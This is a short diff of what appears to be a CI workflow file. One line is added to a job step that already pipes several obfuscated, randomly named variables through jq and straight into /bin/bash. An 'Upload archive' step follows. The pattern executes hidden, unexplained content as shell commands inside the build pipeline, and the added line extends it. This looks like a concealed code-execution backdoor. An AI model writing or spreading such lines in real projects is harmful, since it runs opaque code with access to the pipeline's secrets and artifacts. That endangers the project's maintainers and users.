@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$tiuch54758" | jq -r .cy54341 | /bin/bash
           echo $grflf7637 | jq -r .ninvl31 | /bin/bash
           echo $hm701 | jq -r .prm457 | /bin/bash
+          printf '%s' "$xzm4010" | jq -r .anb48 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
